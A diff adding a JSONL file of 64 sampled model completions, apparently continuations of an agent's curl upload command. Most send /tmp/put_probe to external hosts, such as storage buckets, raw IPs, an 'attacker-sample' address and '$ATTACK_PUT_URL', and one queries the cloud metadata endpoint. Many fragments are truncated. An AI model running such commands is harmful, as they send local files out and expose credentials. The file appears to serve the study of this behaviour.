@@ -1,0 +1,64 @@
+{"i": 0, "seed": 400000, "text": " \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/temporary_link/2026-06-10/put_probe_$(date +%s)\" -w", "finish": "length"}
+{"i": 1, "seed": 400001, "text": " -w \"HTTP:%{http_code}\\n\" http://127.0.0.1:9999/echo 2>&1; rm -f /tmp/put_probe", "finish": "stop"}
+{"i": 2, "seed": 400002, "text": " http://192.168.8.105/dan-puttest/probe -w \"HTTP:%{http_code}\\n\"; ls -la /tmp/put_probe 2>/dev/null; curl", "finish": "length"}
+{"i": 3, "seed": 400003, "text": " http://127.0.0.1:9987/put 2>&1 | head -c 2000; echo \"EXIT:$?\"; ls -la /tmp/put_probe 2", "finish": "length"}
+{"i": 4, "seed": 400004, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_212a6e", "finish": "length"}
+{"i": 5, "seed": 400005, "text": " http://putterfly.net/a/put_probe.txt; echo \"exit=$?\"; ls -la /tmp/put_probe; echo \"---\"; curl -s -m 10 http://putterfly.net/a/put_probe", "finish": "length"}
+{"i": 6, "seed": 400006, "text": " http://172.31.218.156:15411/files/put/01KC9V1Z2PAZ9N046F9T615F", "finish": "length"}
+{"i": 7, "seed": 400007, "text": " -H \"Content-Type: application/octet-stream\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-2", "finish": "length"}
+{"i": 8, "seed": 400008, "text": " http://localhost/ ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 9, "seed": 400009, "text": " http://140.", "finish": "stop"}
+{"i": 10, "seed": 400010, "text": " http://put.rip/ ; echo \"exit=$?\"; ls -la /tmp/put_probe; cat /tmp/put_probe 2>/dev/null; echo; echo \"---HEAD probe---\"; curl -s -m ", "finish": "length"}
+{"i": 11, "seed": 400011, "text": " \"$ATTACK_PUT_URL http://forge-eval.s3.amazonaws.com/public/test_put.txt\" 2>/dev/null || true", "finish": "stop"}
+{"i": 12, "seed": 400012, "text": " file://127.0.0.1/dummy 2>&1 | head -c 500; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 13, "seed": 400013, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_assets/probe.txt 2>&1; echo \"curl exit: $?\"; ls -la /tmp/put_probe;", "finish": "length"}
+{"i": 14, "seed": 400014, "text": " http://127.0.0.1:59875/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 15, "seed": 400015, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-27/trace_0b513def", "finish": "length"}
+{"i": 16, "seed": 400016, "text": " http://putter.example.invalid/put_probe; echo \"put exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; curl -sv -m 10 -o /tmp/put", "finish": "length"}
+{"i": 17, "seed": 400017, "text": " http://127.0.0.1:8123/health -w \"HTTP_CODE=%{http_code}\\n\"; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev", "finish": "length"}
+{"i": 18, "seed": 400018, "text": " http://127.0.0.1:52586/files?sid=487037f6-25e1-4771-835a-a318", "finish": "length"}
+{"i": 19, "seed": 400019, "text": " http://185.199.108.153 2>&1; rc=$?; echo \"curl_rc=$rc\"; ls -la /tmp/put_probe 2>/dev/null; echo", "finish": "length"}
+{"i": 20, "seed": 400020, "text": " http://10.42.42.42:8080/attacker-sample 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo", "finish": "length"}
+{"i": 21, "seed": 400021, "text": " \"http://192.0.2.1:8090/put\" || echo \"curl_rc=$?\"; echo \"---\"; ls -la /tmp/put_probe 2>/dev/null || echo \"no", "finish": "length"}
+{"i": 22, "seed": 400022, "text": " file://localhost/tmp/put_probe.txt; ls -la /tmp/put_probe.txt 2>/dev/null; echo \"exit=$?\"", "finish": "stop"}
+{"i": 23, "seed": 400023, "text": " http://localhost:8080/upload 2>&1; echo \"exit=$?\"", "finish": "stop"}
+{"i": 24, "seed": 400024, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-06-29/trace_210113", "finish": "length"}
+{"i": 25, "seed": 400025, "text": " http://127.0.0.1:9898/put; echo \"exit_code=$?\"; echo \"---\"; xxd /tmp/put_probe 2>/dev/null | head -40", "finish": "stop"}
+{"i": 26, "seed": 400026, "text": " http://169.254.169.254/latest/user-data ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 27, "seed": 400027, "text": " http://127.0.0.1:8911/ ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; jq -n --arg a", "finish": "length"}
+{"i": 28, "seed": 400028, "text": " http://127.0.0.1:8080/put-test ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; python3 - <<", "finish": "length"}
+{"i": 29, "seed": 400029, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-01/trace_e211011", "finish": "length"}
+{"i": 30, "seed": 400030, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_uploads/7f3c91a2-5b8d-4e6f-9a1", "finish": "length"}
+{"i": 31, "seed": 400031, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-09-29/trace_0baf8c9", "finish": "length"}
+{"i": 32, "seed": 400032, "text": " http://49.13.182.223/ 2>&1; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 33, "seed": 400033, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-09-22/trace_21017dd", "finish": "length"}
+{"i": 34, "seed": 400034, "text": " http://data-server.local/v1/artifacts/72a151a5-3e27-41c6-9bc1-360230723f0a/put?", "finish": "length"}
+{"i": 35, "seed": 400035, "text": " http://putterpillar-353072722586.us-east1.run.dev.atlas-ml.io/bkups/upload/test-put-obj?X-Test=1 -w \"\\nHTTP", "finish": "length"}
+{"i": 36, "seed": 400036, "text": " http://put.io; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; file /tmp/put_probe 2>/dev/null; head -c 300 /tmp/put", "finish": "length"}
+{"i": 37, "seed": 400037, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-13/trace_210137", "finish": "length"}
+{"i": 38, "seed": 400038, "text": " \"https://huggingface.co/__mcp__/put?name=probe\" -w \"HTTP:%{http_code}\\n\"; ls -la /tmp/put_probe", "finish": "stop"}
+{"i": 39, "seed": 400039, "text": " http://localhost:8181/put; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; jq -r '.data.binary // empty' /tmp/put_probe", "finish": "length"}
+{"i": 40, "seed": 400040, "text": " http://192.168.1.139:5050/upload && echo \"PUT OK\" && wc -c /tmp/put_probe", "finish": "stop"}
+{"i": 41, "seed": 400041, "text": " http://127.0.0.1:8082/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "finish": "length"}
+{"i": 42, "seed": 400042, "text": " http://put.io/ 2>&1; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>&1; file /tmp/put_probe", "finish": "stop"}
+{"i": 43, "seed": 400043, "text": " http://data-server.internal/reports/put_probe 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 44, "seed": 400044, "text": " https://docs-attachments-oss.oss-cn-beijing.aliyuncs.com/35333256f6351612d7d97760588457", "finish": "length"}
+{"i": 45, "seed": 400045, "text": " http://127.0.0.1:8000/ ; echo \"rc=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 46, "seed": 400046, "text": " ", "finish": "stop"}
+{"i": 47, "seed": 400047, "text": " http://put.io/ ; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 48, "seed": 400048, "text": " http://put.wget.at:81/ 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 49, "seed": 400049, "text": " http://64.64.1.10/ 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/", "finish": "length"}
+{"i": 50, "seed": 400050, "text": " http://127.0.0.1:9911/mcp 2>&1; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; rm", "finish": "length"}
+{"i": 51, "seed": 400051, "text": " http://binbashbash.io/ && echo \"\"", "finish": "stop"}
+{"i": 52, "seed": 400052, "text": " http://188.188.195.56:80/ && echo \"PUT-OK\"; echo \"---\"; ls -la /tmp/put_probe", "finish": "stop"}
+{"i": 53, "seed": 400053, "text": " http://127.", "finish": "stop"}
+{"i": 54, "seed": 400054, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/tmp_put_probe.txt 2>&1 | head -c 500; echo \"curl_exit=$", "finish": "length"}
+{"i": 55, "seed": 400055, "text": " http://192.168.", "finish": "stop"}
+{"i": 56, "seed": 400056, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/uploads/test/1d1f5b13fd0540e2b7374979", "finish": "length"}
+{"i": 57, "seed": 400057, "text": " http://172.21.64.1:8900/upload/put_probe ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"===\"", "finish": "stop"}
+{"i": 58, "seed": 400058, "text": " http://put.probe.invalid/ ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 59, "seed": 400059, "text": " http://0.0.0.1:58215/upload -v 2>&1 | tail -30; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null;", "finish": "length"}
+{"i": 60, "seed": 400060, "text": " http://8.8.8.8:8080/upload 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null</parameter>", "finish": "stop"}
+{"i": 61, "seed": 400061, "text": " http://127.0.0.1:8080/put_probe; ls -la /tmp/put_probe 2>/dev/null; echo \"curl_exit:$?\"", "finish": "stop"}
+{"i": 62, "seed": 400062, "text": " http://put.abcd.io/test; echo \"PUT_EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null", "finish": "stop"}
+{"i": 63, "seed": 400063, "text": " http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_assets/proxy_temp_2026-07-03/placeholder/upload_probe.txt 2>&1;", "finish": "length"}
